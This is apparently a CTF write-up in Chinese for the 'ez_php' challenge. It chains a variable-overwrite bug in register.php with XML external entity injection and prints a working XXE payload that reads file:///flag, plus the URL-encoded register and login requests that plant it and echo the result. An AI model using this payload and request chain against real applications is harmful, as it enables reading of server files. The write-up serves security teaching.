## ez_php


***

出题人：fmyyy

代码审计+变量覆盖+XXE

![image-20240413223039420](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413223039420.png)

register.php处存在变量覆盖

![descript](C:/Users/26272/Pictures/media/46e37e649ddbe4412c77ed7d937524c7.png)

审计代码，发现注册用户的方式是将用户信息以xml的形式存储。

在登陆处解析xml

![descript](C:/Users/26272/Pictures/media/d66c94d3270b601c2b528b014241b484.png)

存在xxe，例如利用变量覆盖写入

```html
<!DOCTYPE test [
        <!ENTITY xxe SYSTEM "file:///flag">
        ]>
<userinfo>
<user>
    <username>&xxe;</username>
    <password>123</password>
</user>
</userinfo>

```

发包

```
/register.php?username=aaa&password=aaa&user_xml_format=%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%0a%20%20%20%20%20%20%20%20%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%0a%20%20%20%20%20%20%20%20%5d%3e%0a%3c%75%73%65%72%69%6e%66%6f%3e%0a%3c%75%73%65%72%3e%0a%20%20%20%20%3c%75%73%65%72%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%75%73%65%72%6e%61%6d%65%3e%0a%20%20%20%20%3c%70%61%73%73%77%6f%72%64%3e%31%32%33%3c%2f%70%61%73%73%77%6f%72%64%3e%0a%3c%2f%75%73%65%72%3e%0a%3c%2f%75%73%65%72%69%6e%66%6f%3e

```

这样就能写入

![descript](C:/Users/26272/Pictures/media/a5c16d0ae41902fc0ff8302fd9c4e66d.png)

如何回显呢？

注意登陆处

![descript](C:/Users/26272/Pictures/media/406f408404f905170a0e61d6d9e4ae79.png)

如果密码错误，会die出用户名，所以xxe的payload需要把username构造为读取的内容，这时候只需要一个错误的密码就行

```bash
/login.php?username=aaa&password=wrong_password

```

![descript](C:/Users/26272/Pictures/media/ffce8b41c2ad651e4b3a0030d7115dde.png)

